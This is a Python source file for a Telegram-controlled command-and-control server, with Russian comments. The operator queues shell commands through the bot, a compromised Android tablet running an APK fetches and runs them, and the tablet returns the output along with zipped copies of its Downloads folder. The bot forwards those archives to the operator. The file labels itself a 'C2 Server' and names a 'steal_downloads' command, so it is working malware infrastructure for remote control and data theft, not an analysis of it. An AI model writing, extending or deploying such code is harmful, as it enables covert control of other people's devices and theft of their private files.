import os
import logging
import asyncio
import json
from aiohttp import web
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import FSInputFile
from aiogram.filters import Command
from dotenv import load_dotenv

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

load_dotenv()

# --- Конфигурация ---
BOT_TOKEN = os.getenv("BOT_TOKEN")
UPLOAD_FOLDER = "uploads"
CONFIG_FILE = "config.json"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Глобальная переменная для текущей команды
current_command = "none"

# Инициализация бота
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# --- Логика хранения CHAT_ID ---
def save_chat_id(chat_id):
    with open(CONFIG_FILE, 'w') as f:
        json.dump({"chat_id": chat_id}, f)

def load_chat_id():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            data = json.load(f)
            return data.get("chat_id")
    return None

# --- Обработчики Бота (Твой пульт управления) ---

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    save_chat_id(message.chat.id)
    await message.answer("✅ Связь установлена. Отправь мне любую команду, и планшет её выполнит.\n\n"
                         "Примеры:\n"
                         "`shell ls -la /sdcard/Downloads`\n"
                         "`steal_downloads` (упакует и пришлет папку)", parse_mode="Markdown")

@dp.message(F.text)
async def set_command(message: types.Message):
    global current_command
    current_command = message.text
    await message.answer(f"⏳ Команда `{current_command}` поставлена в очередь...")

# --- Обработчики Web-сервера (Общение с APK) ---

async def get_cmd_handler(request):
    """Планшет запрашивает команду"""
    global current_command
    cmd = current_command
    current_command = "none"  # Сбрасываем, чтобы не выполнять одно и то же
    return web.Response(text=cmd)

async def post_result_handler(request):
    """Планшет присылает результат выполнения шелла"""
    data = await request.post()
    output = data.get('output', 'Пустой вывод')
    chat_id = load_chat_id()
    if chat_id:
        # Разбиваем на части, если текст слишком длинный для TG (4096 симв)
        if len(output) > 4000:
            output = output[:4000] + "\n...[Обрезано]"
        await bot.send_message(chat_id, f"📝 **Вывод:**\n```\n{output}\n```", parse_mode="Markdown")
    return web.Response(text="ok")

async def upload_handler(request):
    """Планшет загружает ZIP архив"""
    reader = await request.multipart()
    field = await reader.next()
    
    if not field or field.name != 'file':
        return web.Response(text="Поле 'file' не найдено", status=400)

    filename = field.filename
    file_path = os.path.join(UPLOAD_FOLDER, filename)
    
    with open(file_path, 'wb') as f:
        while True:
            chunk = await field.read_chunk()
            if not chunk:
                break
            f.write(chunk)

    logger.info(f"Получен файл: {filename}")
    
    chat_id = load_chat_id()
    if chat_id:
        try:
            await bot.send_document(chat_id, FSInputFile(file_path), caption="📦 Архив из Downloads")
        except Exception as e:
            logger.error(f"Ошибка отправки в TG: {e}")
    
    return web.Response(text="ok")

async def index_handler(request):
    return web.Response(text="C2 Server Active", content_type='text/html')

# --- Запуск приложения ---

async def main():
    app = web.Application()
    app.add_routes([
        web.get('/', index_handler),
        web.get('/cmd', get_cmd_handler),
        web.post('/result', post_result_handler),
        web.post('/upload', upload_handler),
    ])

    runner = web.AppRunner(app)
    await runner.setup()
    
    # Порт для Render (он берет его из переменной окружения PORT)
    port = int(os.environ.get("PORT", 5000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    
    logger.info(f"Сервер запущен на порту {port}")
    
    await asyncio.gather(
        site.start(),
        dp.start_polling(bot)
    )

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Сервер остановлен")
